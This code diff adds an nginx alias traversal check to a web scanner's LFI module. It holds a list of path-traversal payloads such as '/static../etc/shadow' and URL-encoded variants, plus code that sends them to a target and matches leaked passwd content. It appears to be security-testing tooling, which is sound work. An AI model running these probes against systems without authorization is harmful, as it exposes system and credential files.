@@ -720,7 +720,70 @@ class LFIScanner(BaseScanner):
                 all_results.extend(res)
             except Exception as exc:
                 logger.warning("[LFIScanner] %s failed: %s", prober.name, exc)
+
+        # nginx alias traversal + client-side path traversal
+        try:
+            nginx_results = self._test_nginx_alias_traversal(target)
+            all_results.extend(nginx_results)
+        except Exception as exc:
+            logger.debug("[LFIScanner] nginx alias probe failed: %s", exc)
+
         return all_results
+
+    def _test_nginx_alias_traversal(self, url: str) -> List[Dict]:
+        """
+        nginx off-by-slash alias traversal — /static../etc/passwd
+        ve client-side path traversal (webpack/static asset bypass).
+        """
+        import re
+        from urllib.parse import urlparse, urljoin
+
+        results: List[Dict] = []
+        parsed = urlparse(url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+
+        # nginx alias: /static/ aliased to /var/www/static/ → /static../secret leaks /var/www/secret
+        alias_traversal_paths = [
+            "/static../etc/passwd",
+            "/static../etc/shadow",
+            "/assets../etc/passwd",
+            "/files../etc/passwd",
+            "/media../etc/passwd",
+            "/uploads../etc/passwd",
+            "/css../etc/passwd",
+            "/js../etc/passwd",
+            "/img../etc/passwd",
+            "/images../etc/passwd",
+            # webpack-bundled app bypass
+            "/static/..%2f..%2f..%2fetc%2fpasswd",
+            "/assets/..%2f..%2fetc%2fpasswd",
+        ]
+
+        sensitive_re = re.compile(r"root:x:0:|daemon:|/bin/bash|/bin/sh", re.IGNORECASE)
+
+        for path in alias_traversal_paths:
+            test_url = urljoin(base, path)
+            try:
+                resp = self.session.get(test_url, timeout=8, allow_redirects=False)
+                body = resp.text or ""
+                if resp.status_code == 200 and sensitive_re.search(body):
+                    finding = {
+                        "vuln_type": "nginx Alias Traversal (Off-by-Slash)",
+                        "url": test_url,
+                        "severity": "Critical",
+                        "evidence": f"Sensitive file content via alias path: {path!r}",
+                        "description": (
+                            "nginx alias misconfiguration — off-by-slash in location block "
+                            "allows directory traversal outside the intended alias root."
+                        ),
+                    }
+                    results.append(finding)
+                    self.report_finding(**finding)
+                    return results
+            except Exception as exc:
+                logger.debug("[nginx alias] %s: %s", path, exc)
+
+        return results
 
 
 def run(url: str, session=None, results: dict = None, debug: bool = False, **kwargs) -> List[Dict]:
